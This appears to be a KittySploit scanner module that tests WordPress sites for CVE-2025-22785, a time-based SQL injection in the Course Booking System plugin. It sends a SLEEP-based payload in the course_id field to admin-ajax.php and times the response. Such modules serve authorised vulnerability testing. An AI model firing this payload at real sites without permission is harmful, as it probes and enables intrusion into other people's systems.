#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Course Booking System <= 6.0.6 booking delete SQLi (CVE-2025-22785)."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "course-booking-system"
_VULN_HIGH = (6, 0, 6)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Course Booking System CVE-2025-22785 SQLi detect",
        "description": "Time-based SQLi on cbs_action_booking_delete booking_id/course_id.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-22785",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-22785"],
        "modules": ["auxiliary/admin/http/course_booking_cve_2025_22785_sqli"],
        "tags": ["web", "scanner", "wordpress", "course-booking-system", "sqli", "cve-2025-22785"],
        "agent": {"approval_required": True},
    }

    base_path = OptString("/", "WordPress base path", required=False)
    sleep_seconds = OptInteger(8, "Sleep seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        sleep_s = int(self.sleep_seconds or 8)
        data = f"action=cbs_action_booking_delete&booking_id=1&course_id=1 AND (SELECT 1 FROM (SELECT(SLEEP({sleep_s})))sqltest)"
        start = time.monotonic()
        r = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
            timeout=sleep_s + 20,
        )
        elapsed = time.monotonic() - start
        if r and r.status_code == 200 and elapsed >= sleep_s - 1:
            self.set_info(
                severity="critical",
                reason="Course Booking CVE-2025-22785 time-based SQLi",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2025-22785",
            )
            return True
        return False
